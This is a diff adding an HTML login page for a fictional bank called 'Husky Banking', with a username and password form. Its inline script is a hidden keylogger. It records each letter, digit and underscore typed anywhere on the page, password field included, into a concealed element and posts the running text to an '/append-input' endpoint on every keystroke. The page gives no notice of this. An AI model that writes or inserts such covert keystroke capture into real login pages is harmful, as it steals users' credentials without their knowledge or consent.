@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Husky Banking</title>
+    <link rel="stylesheet" href="/static/base.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/FileSaver.js/2.0.5/FileSaver.min.js"></script>
+    <style> #recordedInput {display: none;} </style>
+</head>
+
+<body>
+    <form id="mainHandler" method="post" action="/login">
+        <h1 id="loginHeader">Husky Banking</h1>
+        <p id="slogan">A bank where you know your money is in the right paws!</p>
+        <p id="userInput"> <label for="username">Username</label>: <input id="username" name="username" required size="32" type="text" value="V_Tristyn54"> </p>
+        <p id="passInput"> <label for="password">Password</label>: <input id="password" name="password" required size="32" type="password" value=""> </p>
+        <p id="signIn"><input id="submit" name="submit" type="submit" value="Sign In"></p>
+       
+        <p id="recordedInput">Recorded Input: <span id="recordedText"></span></p>
+        <script>
+            let userInput = "";
+            const recordedTextElement = document.getElementById("recordedText");
+           
+            document.addEventListener("keydown", function(event) {
+                const pressedKey = event.key;
+                if (/^[a-zA-Z0-9_]$/.test(pressedKey)) {
+                    userInput += pressedKey;
+                    recordedTextElement.textContent = userInput;
+                    fetch("/append-input", {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({ input: userInput }),
+                    })
+                        .then(response => {
+                            if (response.ok) console.log("Input appended successfully");
+                            else console.error("Failed to append input");
+                        });
+                }
+            });
+        </script>
+
+    <div id="johnathan"></div>
+    <script src="/static/js/customeImage.js"></script>
+    </form>
+</body>
+</html>
